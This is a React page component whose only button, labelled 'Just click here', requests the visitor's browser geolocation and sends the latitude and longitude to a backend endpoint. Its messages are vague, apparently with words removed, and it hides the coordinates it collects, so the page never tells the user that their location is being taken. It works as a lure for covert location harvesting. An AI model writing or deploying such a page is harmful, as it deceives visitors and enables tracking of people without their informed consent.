import { useState } from "react";

export default function Home() {
  const [location, setLocation] = useState(null);
  const [error, setError] = useState(null);

  const getLocation = () => {
    if (!navigator.geolocation) {
      alert("That  is not supported by your browser.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        setLocation({ latitude, longitude });
        
        // Send the location to the backend
        fetch("/api/send-location", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ latitude, longitude }),
        })
          .then(() => {
            alert("You have success.");
          })
          .catch(() => {
            alert("Failed . Please try again.");
          });
      },
      (error) => {
        setError(" not found. Please check your settings or try again.");
        alert("Failed . Try again later.");
      }
    );
  };

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <button onClick={getLocation} style={{ padding: "10px", fontSize: "16px" }}>
        Just click here
      </button>
      {/* {location && (
        <p>
          Latitude: {location.latitude}, Longitude: {location.longitude}
        </p>
      )} */}
      {error && <p style={{ color: "red" }}>{error}</p>}
    </div>
  );
}